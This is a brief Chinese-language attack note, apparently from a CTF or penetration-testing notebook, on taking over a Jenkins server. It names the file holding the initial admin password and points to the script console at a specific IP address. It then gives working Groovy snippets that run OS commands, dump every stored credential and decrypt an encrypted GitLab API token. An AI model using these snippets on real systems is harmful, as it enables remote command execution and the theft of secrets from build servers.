Jenkins初始管理员密码保存位置

`C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword`

## 后台RCE

访问这里可以执行命令 `http://39.99.158.227:8080/manage/script`

![](F:\LocalCTF\pictures\3-3-1024x516.png)

```bash
println("whoami".execute().text)
```



执行Groovy获取相应的凭据

```bash
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  it.properties.each { prop, val ->
    println(prop + ' = "' + val + '"')
  }
  println("-----------------------")
}
```

Gitlab apitoekn解密

```bash
println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())
```

